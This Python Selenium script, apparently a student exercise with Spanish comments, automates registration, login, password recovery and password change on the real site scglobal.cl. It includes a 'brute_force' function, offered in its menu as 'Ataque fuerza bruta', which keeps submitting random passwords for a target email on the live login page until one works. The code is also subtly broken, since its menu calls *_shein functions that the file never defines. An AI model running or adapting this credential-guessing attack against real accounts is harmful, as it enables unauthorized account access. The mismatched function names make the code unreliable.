import time

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.webdriver import ActionChains

import string
import random

# Generar contraseñas

password_characters = string.ascii_letters + string.digits + string.punctuation

def get_random_string(length):
    random_pw = ''.join(random.choice(password_characters) for i in range(length))

    return random_pw


# Información de registro
firstname = ''
lastnames = ''
email = ''
password = '' #min 5 , max 72
new_password = ''
# no recuerda la contraseñas


# Cambiar ruta del controlador para el navegador Firefox
PATH = r'C:\Program Files (x86)\geckodriver.exe'

driver = webdriver.Firefox(executable_path=PATH)

def register_scglobal():
    driver.get("https://www.scglobal.cl/")
    driver.maximize_window()
    
    time.sleep(3)

    register_button = driver.find_element_by_xpath('/html/body/main/header/nav/div/div/div[1]/div[3]/div/div/a[2]')
    register_button.click()

    time.sleep(1)

    gender_selector = driver.find_element_by_xpath('/html/body/main/section/div/div/div/div/section/section/form/section/div[1]/div[1]/label[1]/span/input')
    gender_selector.click()

    name_field = driver.find_element_by_name('firstname')
    name_field.send_keys(firstname)

    lastnames_field = driver.find_element_by_name('lastname')
    lastnames_field.send_keys(lastnames)

    email_field = driver.find_element_by_name('email')
    email_field.send_keys(email)

    password_field = driver.find_element_by_name('password')
    password_field.send_keys(password)

    TyC_check = driver.find_element_by_xpath('/html/body/main/section/div/div/div/div/section/section/form/section/div[7]/div[1]/span/input')
    TyC_check.click()

    save_btn = driver.find_element_by_xpath('/html/body/main/section/div/div/div/div/section/section/form/footer/button')
    save_btn.click()

    return

def login_scglobal():

    driver.get("https://www.scglobal.cl/")
    driver.maximize_window()

    time.sleep(3)

    login_button = driver.find_element_by_xpath('/html/body/main/header/nav/div/div/div[1]/div[3]/div/div/a[1]')
    login_button.click()

    time.sleep(1)

    mail_field = driver.find_element_by_name('email')
    mail_field.send_keys(email)

    password_field = driver.find_element_by_name('password')
    password_field.send_keys(password)

    login_button = driver.find_element_by_xpath('/html/body/main/section/div/div/div/div/section/section/form/footer/button')
    login_button.click()

    return

def restore_pw_scglobal():

    driver.get("https://www.scglobal.cl/")
    driver.maximize_window()

    time.sleep(3)

    login_button = driver.find_element_by_xpath('/html/body/main/header/nav/div/div/div[1]/div[3]/div/div/a[1]')
    login_button.click()

    time.sleep(1)

    restore_password_link = driver.find_element_by_xpath('/html/body/main/section/div/div/div/div/section/section/form/section/div[3]/a')
    restore_password_link.click()

    mail_field = driver.find_element_by_id('email')
    mail_field.send_keys(email) 
    mail_field.send_keys(Keys.ENTER)


    return
 
def pw_change_scglobal():

    driver.get("https://www.scglobal.cl/")

    driver.maximize_window()
    

    time.sleep(3)

    login_button = driver.find_element_by_xpath('/html/body/main/header/nav/div/div/div[1]/div[3]/div/div/a[1]')
    login_button.click()

    time.sleep(1)

    mail_field = driver.find_element_by_name('email')
    mail_field.send_keys(email)

    password_field = driver.find_element_by_name('password')
    password_field.send_keys(password)

    login_button = driver.find_element_by_xpath('/html/body/main/section/div/div/div/div/section/section/form/footer/button')
    login_button.click()

    time.sleep(1)

    account_btn = driver.find_element_by_xpath('/html/body/main/section/div/div/div/div/section/div/div/a[1]/span')
    account_btn.click()

    current_pw_field = driver.find_element_by_name('password')
    current_pw_field.send_keys(password)

    new_pw_field = driver.find_element_by_name('new_password')
    new_pw_field.send_keys(new_password)

    html = driver.find_element_by_tag_name('html')
    html.send_keys(Keys.PAGE_DOWN)
    html.send_keys(Keys.PAGE_DOWN)
    html.send_keys(Keys.PAGE_UP)

    time.sleep(2)

    TyC_check = driver.find_element_by_xpath('/html/body/main/section/div/div/div/div/section/form/section/div[8]/div[1]/span/input')
    TyC_check.click()


    save_btn = driver.find_element_by_xpath('/html/body/main/section/div/div/div/div/section/form/footer/button')
    save_btn.click()

    return

def brute_force(n, driver):
    while n != 0:

        driver.get("https://www.scglobal.cl/")
        driver.maximize_window()

        password_rand = get_random_string(8)

        time.sleep(3)

        login_button = driver.find_element_by_xpath('/html/body/main/header/nav/div/div/div[1]/div[3]/div/div/a[1]')
        login_button.click()

        time.sleep(1)

        mail_field = driver.find_element_by_name('email')
        mail_field.send_keys(email)

        password_field = driver.find_element_by_name('password')
        password_field.send_keys(password_rand)

        time.sleep(1    )
        login_button = driver.find_element_by_xpath('/html/body/main/section/div/div/div/div/section/section/form/footer/button')
        login_button.click()

        element = ""

        try:
            element = driver.find_element_by_xpath("/html/body/main/section/div/div/div/div/header/h1").text
        except:
            pass

        n = n - 1
        

        if element == "INICIAR SESIÓN CON SU CUENTA":
            print("Contraseña incorrecta")
        else:
            print("contraseña encontrada: ")
            print(password_rand)
            n = 0

    driver.close()


print("1.- Registro")
print("2.- Iniciar sesión")
print("3.- Cambiar contraseña")
print("4.- Recuperar contraseña")
print("5.- Ataque fuerza bruta")

print("Seleccione la opción que desea: ")

a = input()



if a == "1":
    register_shein()
elif a == "2":
    login_shein()
elif a == "3":
    pw_change_shein()
elif a == "4":
    restore_pw_shein()

elif a == "5":
    brute_force(100, driver)
else:
    print("Opción no válida.")

